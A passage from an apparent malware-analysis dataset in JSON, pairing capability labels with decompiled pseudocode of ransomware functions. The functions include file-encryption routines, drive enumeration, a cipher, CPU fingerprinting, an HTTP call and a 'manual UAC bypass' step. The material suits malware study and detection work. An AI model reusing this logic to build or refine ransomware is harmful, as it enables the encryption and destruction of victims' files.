{\n        bVar5 = false;\n    }\n    return bVar5;\n}\n",
        "token_count": 475
    },
    "0040931e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040931e(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        fcn.0040524d(arg_ch, 0, arg_10h);\n    }\n    fcn.004091e7(arg_8h, arg_ch, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 91
    },
    "00409fee": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409fee(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    uint var_4h;\n    \n    iVar2 = fcn.0040a1cd(arg_8h, arg_ch, arg_10h);\n    iVar4 = iVar2 << 2;\n    if (0 < iVar4) {\n        iVar7 = 0;\n        puVar3 = arg_8h + 8 + iVar2 * 0x10;\n        puVar5 = arg_8h + 8;\n        do {\n            uVar1 = puVar5[-2];\n            iVar7 = iVar7 + 4;\n            iVar4 = iVar4 + -4;\n            puVar5[-2] = puVar3[-2];\n            puVar3[-2] = uVar1;\n            uVar1 = puVar5[-1];\n            puVar5[-1] = puVar3[-1];\n            puVar3[-1] = uVar1;\n            uVar1 = *puVar5;\n            *puVar5 = *puVar3;\n            *puVar3 = uVar1;\n            uVar1 = puVar5[1];\n            puVar5[1] = puVar3[1];\n            puVar3[1] = uVar1;\n            puVar3 = puVar3 + -4;\n            puVar5 = puVar5 + 4;\n        } while (iVar7 < iVar4);\n    }\n    if (1 < iVar2) {\n        iVar4 = iVar2 + -1;\n        puVar6 = arg_8h + 2;\n        do {\n            *(puVar6 + 0xe) =\n                 *(str.ccccwwww[(*(puVar6 + 0xe) >> 0x18) * 4] * 4 + 0x4114c8) ^\n                 *(str.ccccwwww[puVar6[0xf] * 4] * 4 + 0x411cc8) ^\n                 *(str.ccccwwww[(*(puVar6 + 0xe) & 0xff) * 4] * 4 + 0x4120c8) ^\n                 *(str.ccccwwww[puVar6[0x10] * 4] * 4 + 0x4118c8);\n            *(puVar6 + 0x12) =\n                 *(str.ccccwwww[(*(puVar6 + 0x12) >> 0x18) * 4] * 4 + 0x4114c8) ^\n                 *(str.ccccwwww[puVar6[0x13] * 4] * 4 + 0x411cc8) ^ *(str.ccccwwww[puVar6[0x14] * 4] * 4 + 0x4118c8) ^\n                 *(str.ccccwwww[(*(puVar6 + 0x12) & 0xff) * 4] * 4 + 0x4120c8);\n            *(puVar6 + 0x16) =\n                 *(str.ccccwwww[(*(puVar6 + 0x16) >> 0x18) * 4] * 4 + 0x4114c8) ^\n                 *(str.ccccwwww[puVar6[0x17] * 4] * 4 + 0x411cc8) ^ *(str.ccccwwww[puVar6[0x18] * 4] * 4 + 0x4118c8) ^\n                 *(str.ccccwwww[(*(puVar6 + 0x16) & 0xff) * 4] * 4 + 0x4120c8);\n            *(puVar6 + 0x1a) =\n                 *(str.ccccwwww[(*(puVar6 + 0x1a) >> 0x18) * 4] * 4 + 0x4114c8) ^\n                 *(str.ccccwwww[puVar6[0x1b] * 4] * 4 + 0x411cc8) ^ *(str.ccccwwww[puVar6[0x1c] * 4] * 4 + 0x4118c8) ^\n                 *(str.ccccwwww[(*(puVar6 + 0x1a) & 0xff) * 4] * 4 + 0x4120c8);\n            iVar4 = iVar4 + -1;\n            puVar6 = puVar6 + 0x10;\n        } while (iVar4 != 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 1078
    },
    "0040c0a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040c0a6(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, uint32_t arg_18h, uint arg_1ch, \n            uint noname_6, uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, \n            uint noname_25, uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint arg_80h)\n\n{\n    uint uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint var_cch;\n    int32_t var_4h;\n    \n    if ((arg_8h == 0) || (((arg_10h == 0 && (arg_14h != 0)) || (199 < arg_18h)))) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.0040524d(&var_cch, 0, 200);\n        if (arg_18h <= arg_14h) {\n            var_4h = arg_10h - &var_cch;\n            do {\n                iVar3 = var_4h;\n                uVar4 = 0;\n                if (arg_18h != 0) {\n                    do {\n                        puVar2 = &var_cch + uVar4;\n                        *puVar2 = *puVar2 ^ puVar2[iVar3];\n                        uVar4 = uVar4 + 1;\n                    } while (uVar4 < arg_18h);\n                }\n                fcn.0040c1e2(&var_cch);\n                var_4h = var_4h + arg_18h;\n                arg_14h = arg_14h - arg_18h;\n                arg_10h = arg_10h + arg_18h;\n            } while (arg_18h <= arg_14h);\n        }\n        *(&var_cch + arg_14h) = *(&var_cch + arg_14h) ^ arg_1ch;\n        (&stack0xffffff2f)[arg_18h] = (&stack0xffffff2f)[arg_18h] ^ 0x80;\n        if (arg_14h != 0) {\n            uVar4 = 0;\n            do {\n                puVar2 = &var_cch + uVar4;\n                *puVar2 = *puVar2 ^ puVar2[arg_10h - &var_cch];\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < arg_14h);\n        }\n        fcn.0040c1e2(&var_cch);\n        for (; arg_18h <= arg_ch; arg_ch = arg_ch - arg_18h) {\n            if (arg_18h != 0) {\n                fcn.00405228(arg_8h, &var_cch, arg_18h);\n            }\n            fcn.0040c1e2(&var_cch);\n            arg_8h = arg_8h + arg_18h;\n        }\n        if (arg_ch != 0) {\n            fcn.00405228(arg_8h, &var_cch, arg_ch);\n        }\n        puVar5 = &var_cch;\n        for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 908
    },
    "0040cf01": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cf01(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    \n    if (arg_8h[2] - *arg_8h < arg_ch) {\ncode_r0x0040cf16:\n        uVar2 = 0;\n    }\n    else {\n        if (arg_8h[3] != 0) {\n            uVar1 = *arg_8h + arg_ch;\n            *arg_8h = uVar1;\n            if (arg_8h[3] <= uVar1 && uVar1 != arg_8h[3]) goto code_r0x0040cf16;\n        }\n        uVar2 = (*arg_8h[5])(arg_ch);\n    }\n    return uVar2;\n}\n",
        "token_count": 188
    },
    "004033d0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.004033d0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    uint uVar4;\n    uint uVar5;\n    uint var_40h;\n    code *var_3ch;\n    code *var_38h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    code *var_18h;\n    code *var_14h;\n    uint var_10h;\n    int32_t var_4h;\n    \n    uVar3 = 0;\n    arg_8h = 0;\n    if (*0x42168c == 0) {\ncode_r0x00403442:\n        pcVar1 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n        uVar5 = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        uVar4 = 7;\n        fcn.00405082(7, L\"[DBG] \", uVar5);\n        fcn.00405082(8, L\"start encrypt files\\r\\n\", uVar4);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n        *0x421340 = 0;\n        *0x421344 = 0;\n        *0x421348 = 0;\n        *0x42134c = 0;\n        *0x421350 = 0;\n        iVar2 = fcn.004080a1(&var_10h, 0, 0, fcn.00403616);\n        if (iVar2 == 0) {\n            uVar5 = 0x4216a0;\n            (*pcVar1)();\n            uVar4 = 0xc;\n            fcn.00405082(0xc, L\"[ERR] \", uVar5);\n            fcn.00405082(4, L\"IOCP init error\\r\\n\", uVar4);\n            fcn.00405082(4, L\"      %S:%S:%lu\\r\\n\", \"D:\\\\1\\\\rwenc\\\\src\\\\enc.c\");\n        }\n        else {\n            var_30h = &var_10h;\n            var_40h = 0;\n            var_3ch = fcn.00402ca2;\n            var_38h = fcn.00403a65;\n            var_34h = 0;\n            var_28h = 0;\n            var_24h = 0;\n            var_20h = 0;\n            var_1ch = 0;\n            var_18h = fcn.00402c8f;\n            var_14h = fcn.004039e3;\n            if (*0x42168c == 0) {\n                fcn.00408690(&var_40h);\n                if (*0x421688 != 0) {\n                    fcn.00408728(&var_40h, 0);\n                }\n            }\n            else {\n                fcn.004082ae(arg_8h, &var_40h);\n                fcn.004051e4(arg_8h);\n            }\n            if ((*0x42134c <= var_1ch) && ((*0x42134c < var_1ch || (*0x421348 < var_20h)))) {\n                do {\n                    do {\n                        uVar4 = 0x4216a0;\n                        (*pcVar1)();\n                        uVar3 = 7;\n                        fcn.00405082(7, L\"[DBG] \", uVar4);\n                        fcn.00405082(8, L\"wait...\\r\\n\", uVar3);\n                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n                        fcn.004060d2(100);\n                    } while (*0x42134c < var_1ch);\n                } while ((*0x42134c <= var_1ch) && (*0x421348 < var_20h));\n            }\n            fcn.00407ff2(&var_10h, 0x421350);\n            uVar3 = 0x4216a0;\n            (*pcVar1)();\n            fcn.00405082(7, L\"[DBG] \", uVar3);\n            fcn.00405082(8, L\"%llu files (%llu bytes) encrypted!\\r\\n\", *0x421348);\n            uVar3 = 1;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    }\n    else {\n        iVar2 = fcn.0040538f(&var_4h);\n        if (iVar2 != 0) {\n            if ((2 < var_4h) && (arg_8h = fcn.00405197(0x208),  arg_8h != 0)) {\n                fcn.00406bfb(arg_8h, *(iVar2 + 8));\n                fcn.00405381(iVar2);\n                iVar2 = fcn.00406ca4(arg_8h);\n                if (*(arg_8h + -2 + iVar2 * 2) != 0x5c) {\n                    *(arg_8h + iVar2 * 2) = 0x5c;\n                }\n                goto code_r0x00403442;\n            }\n            fcn.00405381(iVar2);\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 1232
    },
    "00408690": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00408690(uint arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_2h;\n    \n    arg_8h_00 = fcn.00405197(0xfffe);\n    if (arg_8h_00 != 0) {\n        fcn.00406625(0x420aa0, 0x405, 6, 0xe, &var_10h);\n        var_2h._0_2_ = 0;\n        fcn.00406bfb(arg_8h_00, &var_10h);\n        while( true ) {\n            if (0x5a < *(arg_8h_00 + 8)) break;\n            iVar2 = (**0x413e1c)();\n            if (iVar2 - 2U < 3) {\n                fcn.004082ae(arg_8h_00, arg_8h);\n                uVar1 = *(arg_8h_00 + 8);\n                if ((0x60 < uVar1) && (uVar1 < 0x7b)) {\n                    *(arg_8h_00 + 8) = uVar1 & 0xffdf;\n                }\n            }\n            *(arg_8h_00 + 8) = *(arg_8h_00 + 8) + 1;\n            *(arg_8h_00 + 0xe) = 0;\n        }\n        fcn.004051e4(arg_8h_00);\n        arg_8h_00 = 1;\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 409
    },
    "004088d4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004088d4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint var_14ch;\n    uint var_cah;\n    ushort var_56h;\n    uint var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int16_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.00406625(0x420aa0, 0x662, 5, 0x82, &var_14ch);\n    uVar6 = 0;\n    var_cah._0_2_ = 0;\n    iVar2 = (**0x413cf4)(&var_14ch, 0, 0, 0, 0);\n    if (iVar2 != 0) {\n        var_30h = var_30h._2_2_ << 0x10;\n        var_48h = 0x3c;\n        var_44h = 0;\n        var_40h = 0;\n        var_3ch = 0;\n        var_38h = 0;\n        var_34h = 1;\n        var_2ch = 0;\n        var_28h = 0;\n        var_24h = 0;\n        var_20h = 0;\n        var_1ch = NULL;\n        var_18h = 1;\n        var_14h = 0;\n        var_10h = 0;\n        var_8h = iVar2;\n        iVar3 = (*str._aG_Qyu._0_4_)(arg_8h, 0, 0, &var_48h);\n        if (iVar3 == 0) {\n            (**0x413cec)(iVar2);\n        }\n        else {\n            *(var_38h + var_34h * 2) = 0;\n            iVar3 = (**0x413bfc)(iVar2, var_38h, var_30h, 0);\n            var_ch = iVar3;\n            if (iVar3 != 0) {\n                if (*var_1ch == 0) {\n                    *var_1ch = 0x2f;\n                }\n                fcn.00406625(0x420aa0, 0x618, 0xf, 8, &var_54h);\n                uVar4 = 0;\n                var_4ch._0_2_ = 0;\n                if (var_3ch == 2) {\n                    uVar4 = 0x800000;\n                }\n                iVar3 = (**0x413d04)(iVar3, &var_54h, var_1ch, 0, 0, 0, uVar4 | 0x100);\n                if (iVar3 != 0) {\n                    bVar1 = false;\n                    fcn.00406625(0x420aa0, 0x713, 0xc, 0x72, &var_cah + 2);\n                    var_56h = 0;\n                    do {\n                        iVar2 = (**0x413bf8)(iVar3, &var_cah + 2, 0xffffffff, arg_ch, arg_10h, arg_10h, 0);\n                        if (iVar2 != 0) break;\n                        iVar2 = fcn.00405c89();\n                        if (iVar2 == 0x2f8f) {\n                            var_4h = 0x13300;\n                            iVar2 = (**0x413be8)(iVar3, 0x1f, &var_4h, 4);\n                            if (iVar2 != 0) {\n                                bVar1 = true;\n                            }\n                        }\n                    } while (bVar1);\n                    *arg_18h = 0;\n                    iVar5 = (**0x413c50)(iVar3, 0);\n                    iVar2 = var_8h;\n                    if (iVar5 != 0) {\n                        var_4h = 0;\n                        var_8h = 4;\n                        iVar5 = (**0x413d90)(iVar3, 0x20000013, 0, &var_4h, &var_8h, 0);\n                        uVar4 = -(iVar5 != 0) & var_4h;\n                        *arg_18h = uVar4;\n                        if (uVar4 == 200) {\n                            uVar6 = fcn.004087ed(iVar3, arg_14h);\n                        }\n                    }\n                    (**0x413cec)(iVar2);\n                    (**0x413cec)(var_ch);\n                    (**0x413cec)(iVar3);\n                    return uVar6;\n                }\n                (**0x413cec)(iVar2);\n                iVar2 = var_ch;\n            }\n            (**0x413cec)(iVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1251
    },
    "00408c5f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00408c5f(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint var_288h;\n    uint var_80h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_40h;\n    uint var_3ch;\n    uint var_28h;\n    uint var_24h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    ushort var_ch;\n    ushort var_ah;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h._0_2_ = 0x7e2;\n    uVar6 = 1;\n    var_10h._2_2_ = 9;\n    var_ch = 0;\n    var_ah = 0xb;\n    var_8h = 0;\n    var_4h = 0;\n    iVar2 = (**0x413d30)(&var_10h, &var_24h);\n    if (iVar2 != 0) {\n        uVar1 = fcn.00405d5a();\n        if ((0x501 < uVar1) && (iVar2 = (**0x413cd8)(&var_14h),  iVar2 == 0)) {\n            return 1;\n        }\n        iVar2 = (**0x413cb4)(&var_288h, 0x104);\n        if (iVar2 != 0) {\n            fcn.00406af4(&var_288h, 0x40ff4c);\n            iVar2 = fcn.00406ca4(&var_288h);\n            fcn.00406625(0x420aa0, 0x42d, 7, 0x1c, &var_5ch);\n            var_40h._0_2_ = 0;\n            fcn.00406625(0x420aa0, 0x4c2, 5, 0x14, &var_3ch);\n            var_28h._0_2_ = 0;\n            iVar5 = 0;\n            var_1ch = &var_5ch;\n            var_18h = &var_3ch;\n            do {\n                puVar8 = &var_80h;\n                uVar7 = 0;\n                uVar3 = fcn.00406af4(&var_288h, (&var_1ch)[iVar5]);\n                iVar4 = (**0x413c58)(uVar3, uVar7, puVar8);\n                if ((iVar4 != 0) && (iVar4 = (**0x413d14)(&var_6ch, &var_24h),  -1 < iVar4)) {\n                    uVar6 = 0;\n                }\n                iVar5 = iVar5 + 1;\n                *(&var_288h + iVar2 * 2) = 0;\n            } while (iVar5 < 2);\n            uVar1 = fcn.00405d5a();\n            if (uVar1 < 0x502) {\n                return uVar6;\n            }\n            (**0x413d7c)(var_14h);\n            return uVar6;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 780
    },
    "00401dd6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00401dd6(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *arg_14h;\n    uint arg_10h;\n    uint var_1a4h;\n    ushort var_6ah;\n    uint var_68h;\n    uint var_1ah;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00406625(0x413060, 0x4ca, 6, 0x4e, &var_68h);\n    var_1ah._0_2_ = 0;\n    fcn.00406625(0x413060, 0xb02, 9, 0x10, &var_1ah + 2);\n    var_8h._0_2_ = 0;\n    iVar1 = fcn.00405f4f(0x80000002, &var_68h, &var_1ah + 2, &var_4h, arg_8h);\n    if (((iVar1 == 0) && (iVar1 = fcn.00405f4f(0x80000001, &var_68h, &var_1ah + 2, &var_4h, arg_8h),  iVar1 == 0)) ||\n       (var_4h != 3)) {\n        iVar1 = fcn.00405197(0x20000);\n        if (iVar1 != 0) {\n            fcn.00406625(0x413060, 0x61, 4, 0x13a, &var_1a4h);\n            var_6ah = 0;\n            (**0x413e04)(iVar1, 0x20000, &var_1a4h, 0x103, *0x4215d0, *0x4215d4, *0x4215ec, *0x4215f0, *0x4215f4, \n                         *0x4215f8, *0x4215fc, *0x421600, *0x421604, *0x421608, *0x42160c, *0x421670, *0x421610, \n                         *0x4215e8 + 2);\n            arg_10h = 0x4216a0;\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n            fcn.00405082(7, L\"[DBG] \", arg_10h);\n            fcn.00405082(8, L\"stat:%s\\r\\n\", iVar1);\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n            arg_14h = arg_8h;\n            iVar2 = fcn.00406ca4(iVar1);\n            iVar2 = fcn.00407979(str.6I0, iVar1, iVar2 * 2, arg_14h);\n            fcn.004051e4(iVar1);\n            if (iVar2 != 0) {\n                iVar1 = fcn.00405fcd(0x80000002, &var_68h, &var_1ah + 2, 3, iVar2, *arg_8h);\n                if (iVar1 != 0) {\n                    return iVar2;\n                }\n                fcn.00405fcd(0x80000001, &var_68h, &var_1ah + 2, 3, iVar2, *arg_8h);\n                return iVar2;\n            }\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 822
    },
    "004053a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004053a4(uint *arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_18h;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = arg_8h;\n    do {\n        iVar2 = var_4h + -0x7ffffffe;\n        if (iVar2 == 0) {\n            puVar1 = cpuid_basic_info(0);\n        }\n        else if (iVar2 == 1) {\n            puVar1 = cpuid_Version_info(1);\n        }\n        else if (iVar2 == 2) {\n            puVar1 = cpuid_cache_tlb_info(2);\n        }\n        else if (iVar2 == 3) {\n            puVar1 = cpuid_serial_info(3);\n        }\n        else if (iVar2 == 4) {\n            puVar1 = cpuid_Deterministic_Cache_Parameters_info(4);\n        }\n        else if (iVar2 == 5) {\n            puVar1 = cpuid_MONITOR_MWAIT_Features_info(5);\n        }\n        else if (iVar2 == 6) {\n            puVar1 = cpuid_Thermal_Power_Management_info(6);\n        }\n        else if (iVar2 == 7) {\n            puVar1 = cpuid_Extended_Feature_Enumeration_info(7);\n        }\n        else if (iVar2 == 9) {\n            puVar1 = cpuid_Direct_Cache_Access_info(9);\n        }\n        else if (iVar2 == 10) {\n            puVar1 = cpuid_Architectural_Performance_Monitoring_info(10);\n        }\n        else if (iVar2 == 0xb) {\n            puVar1 = cpuid_Extended_Topology_info(0xb);\n        }\n        else if (iVar2 == 0xd) {\n            puVar1 = cpuid_Processor_Extended_States_info(0xd);\n        }\n        else if (iVar2 == 0xf) {\n            puVar1 = cpuid_Quality_of_Service_info(0xf);\n        }\n        else if (iVar2 == -0x7ffffffe) {\n            puVar1 = cpuid_brand_part1_info(0x80000002);\n        }\n        else if (iVar2 == -0x7ffffffd) {\n            puVar1 = cpuid_brand_part2_info(0x80000003);\n        }\n        else if (iVar2 == -0x7ffffffc) {\n            puVar1 = cpuid_brand_part3_info(0x80000004);\n        }\n        else {\n            puVar1 = cpuid(iVar2);\n        }\n        uVar5 = puVar1[1];\n        uVar4 = puVar1[2];\n        uVar3 = puVar1[3];\n        var_4h = var_4h + 1;\n        *var_8h = *puVar1;\n        var_8h[1] = uVar5;\n        var_8h[2] = uVar3;\n        var_8h[3] = uVar4;\n        var_8h = var_8h + 4;\n    } while (var_4h < 3);\n    return arg_8h;\n}\n",
        "token_count": 746
    },
    "0040636e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0040636e(void)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint arg_10h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint *var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    ushort var_6h;\n    uint var_4h;\n    \n    uVar2 = (**0x413df0)();\n    uVar1 = fcn.00405d5a();\n    if (0x5ff < uVar1) {\n        iVar3 = fcn.00405648(uVar2);\n        if (iVar3 == 3) {\n            uVar4 = fcn.00405750(uVar2);\n            if (uVar4 < 0x3000) {\n                arg_10h = 0x4216a0;\n                (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n                uVar2 = 7;\n                fcn.00405082(7, L\"[DBG] \", arg_10h);\n                fcn.00405082(8, L\"manual UAC bypass\\r\\n\", uVar2);\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n                fcn.0040606d();\n                iVar3 = fcn.00405823(0, &var_4h);\n                if (iVar3 == 0) {\n                    (**0x413c7c)(0);\n                }\n                uVar2 = fcn.00405c9d();\n                fcn.00406625(0x420aa0, 0x6f4, 0x10, 10, &var_10h);\n                var_4ch = 0x3c;\n                var_48h = 0;\n                var_6h = 0;\n                var_44h = (**0x413d68)();\n                var_40h = &var_10h;\n                var_34h = 0;\n                var_30h = 1;\n                var_2ch = 0;\n                var_28h = 0;\n                var_24h = 0;\n                var_20h = 0;\n                var_1ch = 0;\n                var_18h = 0;\n                var_14h = 0;\n                var_3ch = iVar3;\n                var_38h = uVar2;\n                do {\n                    iVar5 = (**0x413cac)(&var_4ch);\n                } while (iVar5 == 0);\n                fcn.004051e4(iVar3);\n                fcn.004051e4(uVar2);\n                (**0x413c7c)(0);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 703
    },
    "00407450": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407450(int32_t arg_8h, uint arg_ch, code *arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*(arg_8h + 8) != 0) {\n        do {\n            iVar1 = *(*(arg_8h + 0xc) + uVar2 * 4);\n            if (*(iVar1 + 4) != 5) {\n                return 0;\n            }\n            (*arg_10h)(arg_ch, *(iVar1 + 0xc), *(iVar1 + 8));\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *(arg_8h + 8));\n    }\n    return 1;\n}\n",
        "token_count": 179
    },
    "00403ab3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ab3(uint arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t arg_8h_01;\n    bool bVar2;\n    uint var_3ch;\n    uint32_t var_20h;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar1 = 0;\n    arg_8h_01 = 0;\n    var_8h = 0;\n    var_ch = 0;\n    (**0x413dd0)(&var_3ch);\n    arg_8h_00 = (**0x413c10)(arg_8h, 0xc0000000, 1, 0, 3, 0, 0);\n    var_18h = arg_8h_00;\n    if (arg_8h_00 != -1) {\n        var_10h = arg_ch;\n        var_14h = arg_10h;\n        arg_8h_00 = (**0x413e4c)(arg_8h_00, 0, 4, 0, 0, 0);\n        if (arg_8h_00 == 0) goto code_r0x00403ba9;\n        if (-1 < arg_10h) {\n            if (arg_10h < 1) goto code_r0x00403b87;\n            do {\n                do {\n                    var_4h = var_20h;\n                    if ((arg_10h < 1) && ((arg_10h < 0 || (arg_ch < var_20h)))) {\n                        var_4h = arg_ch;\n                    }\n                    arg_8h_01 = (**0x413d1c)(arg_8h_00, 0xf001f, var_ch, var_8h, var_4h);\n                    if (arg_8h_01 == 0) goto code_r0x00403b9e;\n                    fcn.0040524d(arg_8h_01, 0, var_4h);\n                    (**0x413e00)(arg_8h_01);\n                    bVar2 = CARRY4(var_8h, var_4h);\n                    var_8h = var_8h + var_4h;\n                    var_ch = var_ch + bVar2;\n                    arg_ch = var_10h - var_4h;\n                    arg_10h = var_14h - (var_10h < var_4h);\n                    var_14h = arg_10h;\n                    var_10h = arg_ch;\n                } while (0 < arg_10h);\n                if (arg_10h < 0) break;\ncode_r0x00403b87:\n            } while (arg_ch != 0);\n        }\n        uVar1 = 1;\n        if (arg_8h_01 != 0) {\n            (**0x413e00)(arg_8h_01);\n        }\n    }\ncode_r0x00403b9e:\n    if 